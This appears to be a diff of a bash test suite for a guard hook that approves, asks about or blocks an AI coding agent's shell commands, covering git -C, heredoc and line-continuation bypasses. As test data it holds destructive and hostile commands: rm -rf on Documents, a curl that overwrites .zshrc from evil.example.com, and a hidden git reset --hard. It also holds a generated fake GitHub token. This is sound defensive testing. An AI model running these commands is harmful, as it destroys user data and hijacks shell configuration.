@@ -261,12 +261,20 @@ chk ask  "bash -c 'rm -rf /Users/x/Documents'"                     'bash -c: р�
 chk ask  "sh -c 'curl -o /Users/x/.zshrc https://evil.example.com'" 'sh -c: curl пишет файл'
 chk pass 'zsh -c "rg -n foo ."'                                    'zsh -c: безобидный поиск'
 chk pass 'bash tools/claude/hooks/pretooluse-guard.test.sh'        'запуск файла, не -c'
+# `shell -c BODY` written INSIDE a heredoc body (as opposed to among a call's own
+# arguments) — shellc_bodies greps the raw command text unconditionally, heredoc
+# bodies included, so bash finds this regardless of what the heredoc is feeding.
+chk deny $'ssh host <<EOF\nbash -c "git reset --hard"\nEOF'        'shell -c внутри тела heredoc'
 
 section 'git с глобальными флагами: -C и -c не обходят гейты'
 # `Bash(git -C:*)` is allow-listed and the prefix rules do not match `git -C …`, so
 # everything that used to rest on them has to hold here.
 chk ask  'git -C /repo push'                                       'push из другого каталога (ветку не определить)'
 chk ask  'git push origin main'                                    'push в main'
+# The FIRST bare " push " in the text is -C's own argument value here, not the real
+# push subcommand; `push` is also not a resolvable directory, so the current-branch
+# check (which must still run) cannot tell the branch either — ask either way.
+chk ask  'git -C push push origin'                                 '-C со значением "push" не путается с сабкомандой push'
 
 section 'push: feature-ветка молча, защищённая ветка / force / delete — ask'
 # An autonomous run ends with a push of its branch; the blanket ask waited hours for
@@ -679,6 +687,71 @@ EOF
   fi
   rm -rf "$R"
 fi
+
+section 'разбор: -C выживает даже когда mvdan/sh не парсит строку целиком'
+printf '\n%s\n' "$SECTION"
+# zsh glob-квалификаторы (*(N)) и незамкнутая кавычка обе не парсятся как bash-синтаксис,
+# так что Go-порт уходит на текстовый fallback-путь — и на нём Finding 1 (ревью Opus) был
+# в том, что `git -C <dir>` там вообще пропадал: push/commit разрешались против cwd самого
+# хука, а не против каталога из -C. cwd здесь — чистый репозиторий на feature-ветке;
+# -C указывает на отдельный репозиторий на main, куда и должны попасть push/gitleaks.
+dchk() { # dchk <ожидаем> <cwd> <команда> <описание>
+  local got
+  got=$(jq -nc --arg c "$3" '{tool_input:{command:$c}}' \
+        | (cd "$2" && "$HOOK") \
+        | jq -r '.hookSpecificOutput.permissionDecision // empty')
+  if [[ ${got:-pass} == "$1" ]]; then
+    pass=$((pass + 1)); printf '  ok   %-4s  %s\n' "${got:-pass}" "$4"
+  else
+    fail=$((fail + 1)); printf '  FAIL ждали %s, получили %s: %s\n' "$1" "${got:-pass}" "$4"
+  fi
+}
+FB_MAIN=$(mktemp -d); git -C "$FB_MAIN" init -q -b main
+git -C "$FB_MAIN" config user.email test@example.invalid; git -C "$FB_MAIN" config user.name test
+git -C "$FB_MAIN" commit -q --allow-empty -m init
+FB_FEAT=$(mktemp -d); git -C "$FB_FEAT" init -q -b feat/glob-fallback
+git -C "$FB_FEAT" config user.email test@example.invalid; git -C "$FB_FEAT" config user.name test
+git -C "$FB_FEAT" commit -q --allow-empty -m init
+
+dchk ask "$FB_FEAT" "for f in *.md(N); do :; done; git -C $FB_MAIN push" \
+  'zsh glob-квалификатор — git -C на main всё равно должен дать ask'
+dchk ask "$FB_FEAT" "git -C $FB_MAIN push && echo \"it's done" \
+  'незамкнутая кавычка — git -C на main всё равно должен дать ask'
+
+if ! command -v gitleaks >/dev/null; then
+  skip=$((skip + 1))
+  echo '  SKIP gitleaks не установлен — репро commit-а из Finding 1 пропущено'
+else
+  tok2=$(head -c 400 /dev/urandom | LC_ALL=C tr -dc 'A-Za-z0-9' | head -c 36)
+  printf 'token = "ghp_%s"\n' "$tok2" > "$FB_MAIN/conf.toml"
+  git -C "$FB_MAIN" add conf.toml
+  git -C "$FB_MAIN" diff --cached --no-color > /tmp/fb_main_diff.$$; gitleaks_rc=0
+  gitleaks stdin --no-banner --redact < /tmp/fb_main_diff.$$ >/dev/null 2>&1 || gitleaks_rc=$?
+  rm -f /tmp/fb_main_diff.$$
+  if [[ $gitleaks_rc -ne 1 ]]; then
+    skip=$((skip + 1))
+    echo '  SKIP gitleaks не распознал тестовый токен — репро commit-а из Finding 1 невозможно'
+  else
+    dchk deny "$FB_FEAT" "git -C $FB_MAIN commit -m x && ls src/*.py(N)" \
+      'zsh glob-квалификатор — секрет в целевом репо через -C всё равно найден'
+  fi
+fi
+rm -rf "$FB_MAIN" "$FB_FEAT"
+
+section 'push: перевод строки с backslash не проглатывает текущую ветку (Finding 2)'
+printf '\n%s\n' "$SECTION"
+# Один Go-сегмент покрывает весь `git push \` + перевод строки + `  origin` целиком, и
+# токен "\" от продолжения строки попадал в strings.Fields(rest) как "remote", а настоящий
+# remote после него засчитывался за refspec — has_ref становился true, и проверка текущей
+# ветки пропускалась молча. bash читает по строкам и до второй строки не добирается вовсе,
+# так что remote там тоже мусорный ("\"), has_ref=0, и проверка текущей ветки срабатывает —
+# конечный вердикт совпадает, но по другой причине.
+FB2=$(mktemp -d); git -C "$FB2" init -q -b main
+git -C "$FB2" config user.email test@example.invalid; git -C "$FB2" config user.name test
+git -C "$FB2" commit -q --allow-empty -m init
+dchk ask "$FB2" $'git push \\\n  origin' \
+  'backslash-перевод строки перед origin — ask на main (ветку не проглотило)'
+rm -rf "$FB2"
 
 printf '\nпройдено: %d, провалено: %d, пропущено: %d\n' "$pass" "$fail" "$skip"
 [[ $fail -eq 0 ]]
